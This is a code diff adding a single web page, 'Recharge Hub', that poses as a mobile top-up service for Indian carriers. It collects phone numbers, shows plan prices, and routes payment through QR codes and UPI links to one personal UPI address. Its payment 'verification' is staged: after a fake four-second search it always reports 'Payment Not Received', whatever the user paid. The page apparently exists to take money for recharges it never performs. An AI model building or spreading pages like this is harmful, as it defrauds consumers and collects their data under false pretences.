@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Recharge Hub</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Poppins,sans-serif}
+body{
+background:linear-gradient(180deg,#0057ff,#07142b 35%,#0b0f1a);
+color:#fff;
+}
+.page{display:none;padding:18px}
+.active{display:block}
+
+.header{display:flex;align-items:center;gap:12px;margin-bottom:18px}
+.logo{
+width:52px;height:52px;border-radius:50%;
+background:#fff;color:#0057ff;
+display:flex;justify-content:center;align-items:center;
+font-size:24px;font-weight:bold;
+}
+
+.banner{
+background:linear-gradient(135deg,#00b4ff,#004dff);
+border-radius:22px;
+padding:20px;
+margin-bottom:18px;
+position:relative;
+overflow:hidden;
+}
+.banner h2{font-size:22px}
+.banner p{opacity:.9;margin-top:6px}
+.banner::after{
+content:"5G";
+position:absolute;
+right:18px;
+top:12px;
+font-size:55px;
+font-weight:700;
+opacity:.18;
+}
+
+.card{
+background:rgba(255,255,255,.06);
+backdrop-filter:blur(16px);
+border-radius:22px;
+padding:18px;
+border:1px solid rgba(255,255,255,.12);
+margin-bottom:18px;
+}
+
+input,select{
+width:100%;
+padding:15px;
+border:none;
+outline:none;
+border-radius:14px;
+background:#15243f;
+color:#fff;
+margin-top:12px;
+}
+
+button{
+width:100%;
+padding:15px;
+border:none;
+border-radius:15px;
+background:linear-gradient(135deg,#00b4ff,#0057ff);
+color:#fff;
+font-size:16px;
+font-weight:600;
+margin-top:16px;
+cursor:pointer;
+}
+
+.tabs{
+display:flex;
+gap:8px;
+overflow:auto;
+margin-bottom:16px;
+}
+.tab{
+padding:10px 16px;
+background:#15243f;
+border-radius:999px;
+white-space:nowrap;
+}
+.activeTab{background:#006dff}
+
+.plan{
+background:rgba(255,255,255,.07);
+border:1px solid rgba(255,255,255,.12);
+border-radius:20px;
+padding:16px;
+margin-bottom:12px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+cursor:pointer;
+transition:.25s;
+}
+.plan:hover{
+transform:translateY(-2px);
+border-color:#38b6ff;
+}
+
+.price{font-size:28px;font-weight:700}
+.badge{
+display:inline-block;
+background:#0fd26a;
+padding:4px 10px;
+border-radius:999px;
+font-size:12px;
+margin-bottom:8px;
+font-weight:600;
+}
+.small{font-size:13px;opacity:.85;margin-top:3px}
+.arrow{font-size:24px;color:#59c3ff}
+.qr{width:230px;border-radius:22px;box-shadow:0 0 25px rgba(0,140,255,.35)}
+@keyframes spin{
+  from{transform:rotate(0deg);}
+  to{transform:rotate(360deg);}
+}
+</style>
+</head>
+
+<body>
+
+<!-- PAGE 1 -->
+
+<div id="p1" class="page active">
+
+<div class="header">
+<div class="logo">R</div>
+<div>
+<h2>Recharge Hub</h2>
+<p style="opacity:.8;font-size:13px">Fast Mobile Recharge</p>
+</div>
+</div>
+
+<div class="banner">
+<h2>Unlimited 5G</h2>
+<p>Daily Data • Unlimited Calls • SMS</p>
+</div>
+
+<div class="card">
+
+<h3>Enter Mobile Number</h3>
+
+<input id="number" maxlength="10" placeholder="10 Digit Mobile Number">
+
+<select id="operator">
+<option>Jio</option>
+<option>Airtel</option>
+<option>Vi</option>
+<option>BSNL</option>
+</select>
+
+<button onclick="next1()">Continue</button>
+
+</div>
+
+</div>
+
+<!-- PAGE 2 -->
+
+<div id="p2" class="page">
+
+<h2 style="margin-bottom:18px">Select Recharge</h2>
+
+<div class="tabs">
+<div class="tab activeTab">Popular</div>
+<div class="tab">Unlimited</div>
+<div class="tab">Data</div>
+<div class="tab">Validity</div>
+</div>
+
+<div id="plans"></div>
+
+<button onclick="show('p1')">Back</button>
+
+</div>
+
+<!-- PAGE 3 -->
+
+<div id="p3" class="page">
+
+<h2 style="margin-bottom:18px">Confirm Recharge</h2>
+
+<div class="card">
+
+<p>📱 <b>Number:</b> <span id="cnum"></span></p>
+<p style="margin-top:10px">📶 <b>Operator:</b> <span id="cop"></span></p>
+<p style="margin-top:10px">💰 <b>Plan:</b> ₹<span id="cplan"></span></p>
+
+<button onclick="proceedPayment()">Proceed Payment</button>
+
+</div>
+
+</div>
+
+<!-- PAGE 4 -->
+
+<div id="p4" class="page">
+
+<h2 style="margin-bottom:18px">Payment</h2>
+
+<div class="card" style="text-align:center">
+
+<h3>Scan & Pay</h3>
+
+<img id="qrImage" class="qr" src="" alt="QR Code" style="cursor:pointer;">
+<p style="margin-top:10px;"></p>
+
+<p style="margin-top:12px">
+  Amount: <b>₹<span id="payAmount"></span></b>
+</p>
+
+<button onclick="show('p5')">I Have Paid</button>
+
+</div>
+
+</div>
+
+<script>
+
+const plans=[
+{price:199,badge:"Popular",valid:"18 Days",data:"1.5GB/day • Unlimited Calls • 100 SMS/day"},
+{price:249,badge:"Best Value",valid:"28 Days",data:"1GB/day • Unlimited Calls • 100 SMS/day"},
+{price:299,badge:"True 5G",valid:"28 Days",data:"1.5GB/day • Unlimited Calls • 100 SMS/day"},
+{price:349,badge:"True 5G",valid:"28 Days",data:"2GB/day • Unlimited Calls • 100 SMS/day"},
+{price:399,badge:"Unlimited",valid:"28 Days",data:"2.5GB/day • Unlimited Calls • 100 SMS/day"},
+{price:449,badge:"Premium",valid:"28 Days",data:"3GB/day • Unlimited Calls • 100 SMS/day"},
+{price:749,badge:"Long Validity",valid:"72 Days",data:"2GB/day • Unlimited Calls • 100 SMS/day"}
+];
+
+const qrMap = {
+  199:"qr/199.png",
+  249:"qr/249.png",
+  299:"qr/299.png",
+  349:"qr/349.png",
+  399:"qr/399.png",
+  449:"qr/449.png",
+  749:"qr/749.png"
+};
+
+const upiMap = {
+  199:"upi://pay?pa=sonumaurya0070077@okicici&pn=Sumit&am=199&cu=INR",
+  249:"upi://pay?pa=sonumaurya0070077@okicici&pn=Sumit&am=249&cu=INR",
+  299:"upi://pay?pa=sonumaurya0070077@okicici&pn=Sumit&am=299&cu=INR",
+  349:"upi://pay?pa=sonumaurya0070077@okicici&pn=Sumit&am=349&cu=INR",
+  399:"upi://pay?pa=sonumaurya0070077@okicici&pn=Sumit&am=399&cu=INR",
+  449:"upi://pay?pa=sonumaurya0070077@okicici&pn=Sumit&am=449&cu=INR",
+  749:"upi://pay?pa=sonumaurya0070077@okicici&pn=Sumit&am=749&cu=INR"
+};
+
+let selected=0;
+
+function show(id){
+document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
+document.getElementById(id).classList.add("active");
+}
+
+function next1(){
+
+let n=document.getElementById("number").value.trim();
+
+if(!/^[6-9]\d{9}$/.test(n)){
+alert("Enter valid mobile number");
+return;
+}
+
+loadPlans();
+show("p2");
+
+}
+
+function loadPlans(){
+
+let html="";
+
+plans.forEach(p=>{
+
+html+=`
+<div class="plan" onclick="choose(${p.price})">
+
+<div>
+
+<div class="badge">${p.badge}</div>
+
+<div class="price">₹${p.price}</div>
+
+<div class="small">${p.data}</div>
+
+<div class="small">Validity: ${p.valid}</div>
+
+</div>
+
+<div class="arrow">➜</div>
+
+</div>`;
+
+});
+
+document.getElementById("plans").innerHTML=html;
+
+}
+
+function choose(price){
+
+selected=price;
+
+document.getElementById("cnum").innerText=document.getElementById("number").value;
+document.getElementById("cop").innerText=document.getElementById("operator").value;
+document.getElementById("cplan").innerText=price;
+
+show("p3");
+
+}
+
+async function proceedPayment(){
+
+try{
+
+await fetch("/save",{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+number:document.getElementById("number").value,
+operator:document.getElementById("operator").value,
+plan:selected,
+payment:"Pending"
+})
+});
+
+}catch(e){
+console.log(e);
+}
+
+document.getElementById("payAmount").innerText=selected;
+document.getElementById("qrImage").src=qrMap[selected];
+document.getElementById("qrImage").onclick=function(){
+  window.location.href=upiMap[selected];
+};
+
+show("p4");
+
+}
+
+function verifyUTR(){
+
+let utr=document.getElementById("utr").value.trim();
+let msg=document.getElementById("utrMsg");
+
+if(!/^\d{12}$/.test(utr)){
+msg.style.color="#ff6b6b";
+msg.innerHTML="❌ Invalid UTR (12 digits required).";
+return;
+}
+
+msg.style.color="#3ecbff";
+msg.innerHTML=`
+<div style="display:flex;align-items:center;justify-content:center;gap:10px;">
+  <div style="width:20px;height:20px;border:3px solid rgba(255,255,255,.2);border-top:3px solid #3ecbff;border-radius:50%;animation:spin 1s linear infinite;"></div>
+  <span>Searching payment<span id="dots"></span></span>
+</div>`;
+
+let dots=0;
+let loading=setInterval(()=>{
+  dots=(dots+1)%4;
+  document.getElementById("dots").innerHTML=".".repeat(dots);
+},500);
+
+setTimeout(()=>{
+  clearInterval(loading);
+  msg.innerHTML=`
+  <div style="background:rgba(255,0,0,.12);border:1px solid rgba(255,80,80,.4);padding:15px;border-radius:16px;text-align:center;">
+    <div style="font-size:32px;">❌</div>
+    <div style="font-size:17px;font-weight:700;margin-top:6px;">Payment Not Received</div>
+    <div style="font-size:13px;opacity:.85;margin-top:4px;">Verification is pending. Please wait or contact support.</div>
+  </div>`;
+},4000);
+
+}
+
+</script>
+
+<!-- PAGE 5 -->
+
+<div id="p5" class="page">
+
+<h2 style="margin-bottom:18px">UTR Verification</h2>
+
+<div class="card">
+
+<p>Enter your 12-digit UTR Number</p>
+
+<input id="utr" maxlength="12" placeholder="Enter UTR">
+
+<button onclick="verifyUTR()">Verify Payment</button>
+
+<p id="utrMsg" style="margin-top:15px;color:#ff6b6b;"></p>
+
+</div>
+
+</div>
+
+
+</body>
+</html>
